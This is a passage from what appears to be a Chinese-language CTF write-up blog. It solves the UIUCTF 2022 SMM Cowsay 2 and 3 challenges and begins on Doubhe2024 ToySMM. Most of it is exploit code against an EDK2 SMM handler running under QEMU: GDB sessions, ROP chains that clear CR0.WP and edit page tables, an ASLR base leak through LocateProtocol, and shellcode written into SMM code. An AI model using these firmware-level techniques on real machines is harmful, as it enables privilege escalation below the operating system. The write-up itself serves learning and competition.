class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line">conn.interactive() <span class="comment"># Let&#x27;s see what happens</span></span><br></pre></td></tr></table></figure><p>现在我们可以使用以下脚本启动漏洞利用并附加 GDB：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> script.gdb</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line"><span class="built_in">break</span> *(SmmCowsayHandler + 0x302)</span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb -x script.gdb</span><br><span class="line">...</span><br><span class="line">Breakpoint 1, 0x0000000007ee92c5 <span class="keyword">in</span> SmmCowsayHandler (CommBufferSize=&lt;optimized out&gt;, CommBuffer=0x69bb030, ...</span><br><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x4141414141414141  4702111234474983745</span><br><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0x4141414141414141 <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">(gdb) x/100gx <span class="variable">$rsp</span></span><br><span class="line">0x7fb6a78:  0x0000000007ee92c7  0x0000000007ffa8d8</span><br><span class="line">0x7fb6a88:  0x0000000007ff0bc5  0x00000000069bb030</span><br><span class="line">0x7fb6a98:  0x0000000007fb6c38  0x0000000007fb6b80</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x7fb6b48:  0x00000000069bb018  0x0000000013131300</span><br><span class="line">0x7fb6b58:  0x0000000014141414  0x0000000015151515</span><br></pre></td></tr></table></figure><p>看起来 R13（除了 LSB）、R14 和 R15 不知何故在 <code>rsp + 0xe0</code> 处溢出到堆栈上。从 <code>call rax</code> 返回后， <code>SmmCowsayHandler</code> 中的代码执行以下操作</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30i SmmCowsayHandler + 0x302</span><br><span class="line">   0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   ... a bunch of useless stuff ...</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure><p>因此，在最后一个 <code>ret</code> 时，我们将使寄存器溢出到堆栈上的距离更近。非常方便的是，在我们转储的小工具中，在 <code>VariableSmm.efi + 0x8a49</code> 处有一个 <code>ret 0x70</code> 。我们可以使用这个小工具将 RSP 精确地<strong>移动到溢出的 R14 之上</strong>，从而使我们能够执行另一个 <code>pop rsp; ret</code> 形式的gadget，这将从 R15 的值中获取 RSP 的新值堆栈！在此之后，我们完全控制了堆栈，我们可以编写更长的ROP链。</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>迁移堆栈并启动真正的 ROP 链后，我们需要以下gadget</p><ul><li>设置 CR0 以便能够禁用 <code>CR0.WP</code> 编辑页表。</li><li>写入任意地址的内存以覆盖标志地址的页表条目。</li><li>从内存读入寄存器以获得标志。</li></ul><p>只要有一点耐心，所有这些都可以轻松找到，因为我们手上有很多gadget</p><p>由于地址不会改变，所以我们实际上不需要担心遍历页表：我们只需使用 GDB 找到 <code>0x44440000</code> 的页表条目的地址，然后将其硬编码到漏洞利用中:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl2_idx</span> = (0x44440000 &gt;&gt; 12 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl1_idx</span> = (0x44440000 &gt;&gt; 12) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_entry</span> = *(unsigned long *)(<span class="variable">$cr3</span> + 8 * <span class="variable">$lvl4_idx</span>)</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_entry</span> = *(unsigned long *)((<span class="variable">$lvl4_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl3_idx</span>)</span><br><span class="line">(gdb) set <span class="variable">$lvl2_entry</span> = *(unsigned long *)((<span class="variable">$lvl3_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl2_idx</span>)</span><br><span class="line"></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry_addr</span> = (<span class="variable">$lvl2_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl1_idx</span></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry</span>      = *(unsigned long *)<span class="variable">$lvl1_entry_addr</span></span><br><span class="line"></span><br><span class="line">(gdb) printf &quot;PTE at <span class="number">0</span>x%lx, value = <span class="number">0</span>x%<span class="number">016</span>lx\n&quot;, <span class="variable">$lvl1_entry_addr</span>, <span class="variable">$lvl1_entry</span></span><br><span class="line"></span><br><span class="line">PTE at <span class="number">0</span>x7ed0200, value = <span class="number">0</span>x8000000044440066</span><br></pre></td></tr></table></figure><p>请注意 <code>0x8000000044440066</code> 设置位 63 (NX)与位 0 , 1 未设置（不存在，不可读写）。我们需要设置位 0 以便将页面标记为存在，因此我们想要的值为 <code>0x8000000044440067</code> 。</p><p>从 GDB 检查 CR0 的值，我们得到 <code>0x80010033</code> ：关闭 WP 位会得到 <code>0x80000033</code> ，所以这就是我们在尝试编辑页表条目之前要写入 CR0 的内容在 <code>0x7ed0200</code> 。</p><p>找到我们需要的gadegt后，真正的 ROP 链是这样的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>将flag读到rax寄存器中</p><p>然后执行几次即可获得完整的flag</p><h2 id="uictf2022-cowsay3"><a href="#uictf2022-cowsay3" class="headerlink" title="uictf2022-cowsay3"></a>uictf2022-cowsay3</h2><p>题目描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We fired that engineer. Unfortunately, other engineers refused to touch this code, but instead suggested to integrate some ASLR code found online. Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on. Now that we have the monster combination of ASLR+DEP, we should surely be secure, right?</span><br></pre></td></tr></table></figure><p>在之前的基础上又添加了ASLR以及DEP,但好在smmcowsay.efi的代码并没有改变</p><ol><li><p><code>SMM_CODE_CHK_EN</code> 已启用：这是 <code>MSR_SMM_FEATURE_CONTROL</code> MSR中的一个位，它控制SMM是否可以执行其他两个MSR定义的范围之外的代码： <code>IA32_SMRR_PHYSBASE</code> 和 <code>IA32_SMRR_PHYSMASK</code> （基本上在SMRAM之外）。当设置 <code>SMM_CODE_CHK_EN</code> 时， <code>MSR_SMM_FEATURE_CONTROL</code> 的“Lock”位也在 QEMU 中设置，因此无法禁用此检查。</p><p>这并不是真正的问题，因为我们并没有真正在 SMRAM 之外执行任何代码。假设我们找到了正确的小工具，我们已经可以通过一个简单的 ROP 链（利用 SMRAM 中已有的代码）获得我们想要的东西。</p></li><li><p>ASLR 已添加到 EDK2（<a href="https://github.com/jyao1/SecurityEx来自">https://github.com/jyao1/SecurityEx来自</a> jyao1/SecurityEx 的原始补丁，有一些细微的更改）：现在每个驱动程序都加载到不同的地址，该地址会更改每次启动，并使用 <code>rdrand</code> 指令获取 10 位熵。不用说，这使得像我们之前的漏洞利用那样使用硬编码地址变得不可能。</p></li></ol><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>解决ASLR最常见的办法就是泄露一个基址</p><p>我们如何泄露一些SMM地址以击败ASLR？ EDK2 驱动程序注册了一堆协议。每个协议都有自己的 GUID，使用有效的 GUID 调用 <code>BootServices-&gt;LocateProtocol</code> 将返回指向协议结构的指针（如果存在），该结构驻留在实现协议的驱动程序中！这允许我们泄漏实现在执行代码时注册的协议的任何驱动程序的基地址（在简单的减法之后）</p><p>如果我们查看 EDK2 源代码中的文件<a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec">MdePkg/MdePkg.dec</a>，我们会看到一堆针对不同协议的 GUID。甚至无需浪费时间检查源代码的其他部分，我们就可以将它们全部转储并尝试请求其中的每一个，直到找到一个看起来有趣的地址。</p><p>再次，修补 <code>run.sh</code> 脚本，让 QEMU 将 EDK2 调试输出转储到文件中，就像我们对 SMM Cowsay 2 所做的那样，我们可以找到 SMBASE，在编写漏洞利用程序时假设它是 SMRAM 的起始地址。理论上，SMRAM可以在SMBASE之前和之后扩展，根据Intel Doc，SMBASE只是标记用于查找SMI处理程序和保存状态区域的入口点的基地址。</p><p><code>CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400</code></p><p>现在，使用我们在之前的两个挑战中使用的相同代码，我们可以检查 <code>MdePkg/MdePkg.dec</code> 中列出的每个协议 GUID，并查看返回的地址是否在 SMBASE 之后:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;CPU[000]  APIC ID=0000  SMBASE=&#x27;</span>):</span><br><span class="line">            smbase = <span class="built_in">int</span>(line[<span class="number">31</span>:<span class="number">31</span> + <span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> guid <span class="keyword">in</span> guids:</span><br><span class="line">    code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* LocateProtocol(&amp;guid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">        lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">        call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        test rax, rax</span></span><br><span class="line"><span class="string">        jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fail:</span></span><br><span class="line"><span class="string">        ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    guid:</span></span><br><span class="line"><span class="string">        .octa <span class="subst">&#123;guid&#125;</span></span></span><br><span class="line"><span class="string">    protocol:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">    proto = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> proto &gt; smbase:</span><br><span class="line">        log.info(<span class="string">&#x27;Interesting protocol: GUID = 0x%x, ADDR = 0x%x&#x27;</span>, guid, proto)</span><br></pre></td></tr></table></figure><p>果然，通过让脚本运行足够的时间，我们发现 <code>gEfiSmmConfigurationProtocolGuid</code> 返回一个指向协议地址的指针。查看已加载驱动程序的 <code>debug.log</code> ，我们可以看到该地址位于 <code>PiSmmCpuDxeSmm.efi</code> SMM 驱动程序内部，简单的减法即可得出其基地址。</p><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>现在我们可以看一下 <code>PiSmmCpuDxeSmm.efi</code> 中的gadgets。事实证明，我们很幸运：</p><ul><li>从 GDB 来看，我们仍然有 R13、R14 和 R15 以完全相同的偏移量溢出到 SMI 堆栈上。</li><li>我们可以向前移动堆栈指针： <code>ret 0x6d</code></li><li>我们可以翻转堆栈： <code>pop rsp; ret</code></li><li>我们可以弹出 RAX 和其他寄存器： <code>pop rax ; pop rbx ; pop r12 ; ret</code></li><li>我们可以设置CR0： <code>mov cr0, rax ; wbinvd ; ret</code></li><li>我们有一个 write-what-where 原语： <code>mov qword ptr [rbx], rax ; pop rbx ; ret</code></li></ul><p>我们没有更多好的gadgets可以使用，所以这次在禁用 CR0.WP 后，我们不再使用 ROP 编写整个漏洞利用程序，而是使用 write-what-where gadget 来覆盖 <code>PiSmmCpuDxeSmm.efi</code> 的一段 <code>.text</code> 带有第 2 阶段 shellcode，然后简单地跳转到它。<br>唯一有点烦人的部分是 <code>ret 0x6d</code> gadget 将堆栈向前移动：这将导致堆栈未对齐，落在堆栈上溢出的 R13 值的 2 个最高有效字节中。<strong>这不是一个真正的问题，幸运的是 CPU（或者更好的是 QEMU）似乎并不关心未对齐的堆栈指针。</strong>我们只需使用 R{13,14,15} 进行一些位移即可将值很好地放入堆栈中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># SmmConfigurationProtocol leaked using <span class="title function_">LocateProtocol</span><span class="params">(gEfiSmmConfigurationProtocolGuid)</span></span><br><span class="line">PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - <span class="number">0x16210</span></span><br><span class="line">PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;SmmConfigurationProtocol    @ 0x%x&#x27;</span>, SmmConfigurationProtocol)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi       @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_base)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi .text @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_text)</span><br><span class="line"></span><br><span class="line">new_smm_stack   = buffer + <span class="number">0x800</span></span><br><span class="line">ret_0x6d        = PiSmmCpuDxeSmm_base + <span class="number">0xfc8a</span>  <span class="meta"># ret 0x6d</span></span><br><span class="line">flip_stack      = PiSmmCpuDxeSmm_base + <span class="number">0x3c1c</span>  <span class="meta"># pop rsp ; ret</span></span><br><span class="line">pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + <span class="number">0xd228</span>  <span class="meta"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">mov_cr0_rax     = PiSmmCpuDxeSmm_base + <span class="number">0x10a7d</span> <span class="meta"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">write_primitive = PiSmmCpuDxeSmm_base + <span class="number">0x3b8f</span>  <span class="meta"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x6d)</span><br></pre></td></tr></table></figure><p>正如我们刚才所说，我们将使用一些gadgets来创建 ROP 链，这些gadgets会将第二阶段 shellcode 写入 <code>PiSmmCpuDxeSmm.efi</code> 的 <code>.text</code> 中，然后跳转到它。该 shellcode 必须遍历页表（这次由于 ASLR，我们无法预先计算 PTE 的地址），设置 PTE 上的当前位，然后将标志读入（一个或多个）寄存器。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">stage2_shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rbx, 0xffffffff000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Walk page table */</span></span><br><span class="line"><span class="string">    mov rax, cr3</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x1]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x22]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rbx, rax</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x40]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set present bit */</span></span><br><span class="line"><span class="string">    or al, 1</span></span><br><span class="line"><span class="string">    mov qword ptr [rbx + 8 * 0x40], rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Read flag and die so regs get dumped, GG! */</span></span><br><span class="line"><span class="string">    movabs rax, 0x44440000</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    pop_rax_rbx_r12, <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>     , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    mov_cr0_rax    , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now that CR0.WP is unset, we can just patch SMM code and jump to it!</span></span><br><span class="line"><span class="comment"># Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text</span></span><br><span class="line"><span class="comment"># 8 bytes at a time, then jump into it</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(stage2_shellcode), <span class="number">8</span>):</span><br><span class="line">    chunk = stage2_shellcode[i:i + <span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">    chunk = u64(chunk)</span><br><span class="line"></span><br><span class="line">    real_chain += [</span><br><span class="line">        pop_rax_rbx_r12        , <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">        chunk                  , <span class="comment"># -&gt; RAX</span></span><br><span class="line">        PiSmmCpuDxeSmm_text + i, <span class="comment"># -&gt; RBX</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>             ,</span><br><span class="line">        write_primitive        , <span class="comment"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line">        <span class="number">0xdeadbeef</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">real_chain += [PiSmmCpuDxeSmm_text]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transform real ROP chain into .quad directives to embed in the shellcode:</span></span><br><span class="line"><span class="comment">#   .quad 0x7f8a184</span></span><br><span class="line"><span class="comment">#   .quad 0x80000033</span></span><br><span class="line"><span class="comment">#    ...</span></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br></pre></td></tr></table></figure><p><strong>SMM的代码段是可写的,应该不是本题专属</strong></p><h2 id="Doubhe2024-ToySMM"><a href="#Doubhe2024-ToySMM" class="headerlink" title="Doubhe2024-ToySMM"></a>Doubhe2024-ToySMM</h2><p><em>有了前面三题的基础,这不是乱杀</em></p><p>先跑一下<code>run.sh</code>,看看程序是怎样运行的</p><p>启动后弹出了这么一个窗口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Mapping table</span><br><span class="line">      FS0: Alias(s):HD0a65535a1:;BLK1:</span><br><span class="line">          